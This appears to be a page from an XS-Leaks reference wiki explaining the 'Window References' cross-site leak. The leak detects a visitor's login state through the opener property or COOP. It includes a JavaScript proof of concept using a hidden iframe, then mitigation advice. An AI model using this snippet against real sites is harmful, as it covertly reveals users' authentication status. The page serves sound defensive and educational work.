+++
title = "Window References"
description = ""
date = "2020-10-08"
category = [
    "Attack",
]
abuse = [
    "Window References",
]
defenses = [
    "Fetch Metadata",
    "SameSite Cookies",
    "COOP"
]
menu = "main"
weight = 2
+++


If a page sets its opener property to `null` or is using [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) depending on users' login status, it becomes possible to detect user's current status. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply checking its window reference.

## Code Snippet
The below snippet demonstrates the attack where the target page is supposedly only accessible to authenticated users and is setting its `opener` property to null (or is using COOP with value other than `unsafe-none`):

```javascript
// define vulnerable URL
const url = 'https://example.org/profile';

const exploit = url => {
  // let's use iframe to make the attack a little more stealthier and to avoid browsers' pop-up blockers
  document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks" style="height:700px;width:100%;display:none">');  // insert an invisible iframe
  
  // open the url in iframe and save the reference as win
  const win = open(url, 'xsleaks');
  
  // wait 2 seconds to let the page load
  setTimeout(() => {
    // check the opener property of the newly opened window
    if(!win.opener) console.log('User\'s logged in- reference not defined');
  }, 2000);
}
exploit(url);
```
In case the page is not framable (or uses SameSite cookies), we can instead open the page in a new tab (`target="_blank"`) and achieve the same.
{{< hint tip >}}
The POC only works when `opener` is set to `null` either via JavaScript or using rel="noopener" (or alternative). Pages using COOP requires opening in a new window as they don't work in nested browsing context.
{{< /hint >}}

{{< hint tip >}}
Using a third parameter of `noopener` in [window.open](https://developer.mozilla.org/en-US/docs/Web/API/Window/open#Window_features) also sets `opener` to `null` which is exactly like setting `rel="noopener"` in anchor links.
{{< /hint >}}

## Defense

The mitigation of this XS-Leak is to be consistent everywhere- set it to the same value in all pages using COOP. Using JavaScript to set `opener` to `null` may have edge cases because it's possible to disable JavaScript entirely using iframe's sandbox attribute.
